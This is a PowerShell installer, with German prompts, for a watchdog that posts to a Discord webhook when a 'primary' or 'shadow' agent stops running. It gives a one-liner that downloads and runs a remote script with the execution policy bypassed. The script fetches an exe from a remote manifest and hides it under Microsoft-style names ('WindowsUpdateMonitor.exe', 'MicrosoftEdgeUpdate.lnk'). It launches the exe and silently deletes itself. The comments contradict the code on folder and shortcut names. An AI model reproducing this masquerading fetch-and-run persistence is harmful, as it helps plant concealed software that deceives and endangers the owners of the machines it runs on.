# GuardianMonitor installer — reads the Discord webhook URL interactively,
# writes guardian.json, downloads GuardianMonitor.exe from the manifest, and
# launches it. The Guardian self-installs under %LOCALAPPDATA%\Microsoft\
# Windows\WindowsUpdate\ and sets up its own Startup .lnk on first launch.
#
# Preferred one-liner (Win+R or any cmd prompt, no admin needed):
#
#   cmd /c "curl.exe -sLo %TEMP%\gm.ps1 https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/guardian.ps1&&powershell -NoP -EP Bypass -File %TEMP%\gm.ps1"
#
# Guardian is report-only: it posts a 🔴 Discord message when the primary or
# shadow dies and a 🟢 when they come back. It never re-downloads or re-launches
# the main exes. The owner stays in control of recovery via install.ps1.
#
# Guardian is owner-removable: a single Startup folder .lnk, no scheduled tasks,
# no HKCU Run entries. `shell:startup` → delete `HomeCtrl Monitor.lnk` → gone.

$ErrorActionPreference = 'Stop'

$manifestUrl = 'https://raw.githubusercontent.com/sayamuhbani59-collab/homectrl-updates/main/manifest.json'
# Guardian lives in its own Microsoft subfolder, separate from the primary
# agent's `Microsoft\Windows\WindowsUpdate\` dir, so its config / log / Startup
# .lnk do not accumulate alongside the agent's own files.
$installDir  = Join-Path $env:LOCALAPPDATA 'Microsoft\EdgeUpdate'
$guardianExe = Join-Path $installDir 'WindowsUpdateMonitor.exe'
$configPath  = Join-Path $installDir 'edgeupdate.json'

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# System.Net.Http is not auto-loaded by Windows PowerShell 5.1 — same gotcha
# install.ps1 handles. PS7 ignores the Add-Type.
try { Add-Type -AssemblyName System.Net.Http -ErrorAction Stop } catch {}

$http = [Net.Http.HttpClient]::new()
$http.Timeout = [TimeSpan]::FromSeconds(30)

# -------- 1. Prompt for webhook URL (or re-use existing guardian.json).
$webhookUrl = $null
if (Test-Path $configPath) {
    try {
        $existing = Get-Content -Raw -LiteralPath $configPath | ConvertFrom-Json
        if ($existing.webhookUrl) {
            Write-Host "[*] edgeupdate.json gefunden mit webhookUrl — benutze bestehende."
            $webhookUrl = $existing.webhookUrl
        }
    } catch {
        Write-Host "[!] edgeupdate.json defekt — frage neu"
    }
}
if (-not $webhookUrl) {
    Write-Host ''
    Write-Host 'Discord Webhook URL einfuegen (Rechtsklick in Discord-Channel > Kanal bearbeiten > Integrationen > Webhooks):'
    $webhookUrl = Read-Host 'webhookUrl'
    if (-not $webhookUrl -or $webhookUrl -notlike 'https://discord.com/api/webhooks/*') {
        throw 'Keine gueltige Discord-Webhook-URL eingegeben. Abbruch.'
    }
}

# -------- 2. Fetch manifest.
Write-Host '[*] fetching manifest...'
$manifestJson = $http.GetStringAsync($manifestUrl).GetAwaiter().GetResult()
$manifest = $manifestJson | ConvertFrom-Json
if (-not $manifest.guardianUrl) { throw 'manifest hat kein guardianUrl — Guardian ist noch nicht released. Warte auf naechsten release.' }
Write-Host "[*] version $($manifest.version)"

# -------- 3. Install dir + stop existing Guardian so overwrite works.
if (-not (Test-Path $installDir)) { [void](New-Item -ItemType Directory -Force -Path $installDir) }
try {
    Get-Process -Name 'WindowsUpdateMonitor' -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -eq $guardianExe } |
        ForEach-Object {
            try { [void]$_.CloseMainWindow() } catch {}
            if (-not $_.WaitForExit(500)) { try { $_.Kill() } catch {} }
        }
} catch {}

# -------- 4. Download WindowsUpdateMonitor.exe straight to disk via HttpClient.
Write-Host '[*] downloading WindowsUpdateMonitor.exe...'
$response = $http.GetAsync($manifest.guardianUrl, [Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
if (-not $response.IsSuccessStatusCode) { throw "download HTTP $([int]$response.StatusCode)" }
$dest = [IO.File]::Create($guardianExe)
try   { $response.Content.CopyToAsync($dest).GetAwaiter().GetResult() }
finally { $dest.Dispose(); $response.Dispose() }

# -------- 5. SHA-256 verify (optional field in manifest).
if ($manifest.guardianSha256) {
    $sha = [Security.Cryptography.SHA256]::Create()
    try {
        $stream = [IO.File]::OpenRead($guardianExe)
        try   { $localBytes = $sha.ComputeHash($stream) }
        finally { $stream.Dispose() }
    } finally { $sha.Dispose() }
    $local  = -join ($localBytes | ForEach-Object { $_.ToString('x2') })
    $remote = ($manifest.guardianSha256).ToLower()
    if ($local -ne $remote) {
        try { [IO.File]::Delete($guardianExe) } catch {}
        throw "hash mismatch (expected $remote got $local)"
    }
    Write-Host '[*] hash verified'
}

# -------- 6. Write guardian.json with the webhook URL.
# Only writes fields the user set — Guardian fills defaults for the rest.
$cfg = @{ webhookUrl = $webhookUrl }
$cfgJson = $cfg | ConvertTo-Json
[IO.File]::WriteAllText($configPath, $cfgJson, [Text.UTF8Encoding]::new($false))
Write-Host "[*] edgeupdate.json geschrieben: $configPath"

# -------- 7. Launch Guardian. Guardian self-installs the Startup .lnk on first
# run under its own install path.
Write-Host "[*] launching $guardianExe"
[void][Diagnostics.Process]::Start($guardianExe)

$http.Dispose()
Write-Host '[OK] Monitor laeuft. Postet automatisch in Discord wenn Primary oder Shadow sterben.'
Write-Host '    Entfernen: `shell:startup` oeffnen und "MicrosoftEdgeUpdate.lnk" loeschen, dann WindowsUpdateMonitor-Prozess beenden.'

# -------- 8. Self-cleanup — remove the %TEMP%\gm.ps1 we were launched from.
try {
    $self = $MyInvocation.MyCommand.Path
    if ($self -and (Test-Path $self)) {
        $psi = New-Object Diagnostics.ProcessStartInfo
        $psi.FileName       = 'cmd.exe'
        $psi.Arguments      = "/c timeout /t 2 /nobreak >nul & del /f /q `"$self`""
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow  = $true
        [void][Diagnostics.Process]::Start($psi)
    }
} catch {}
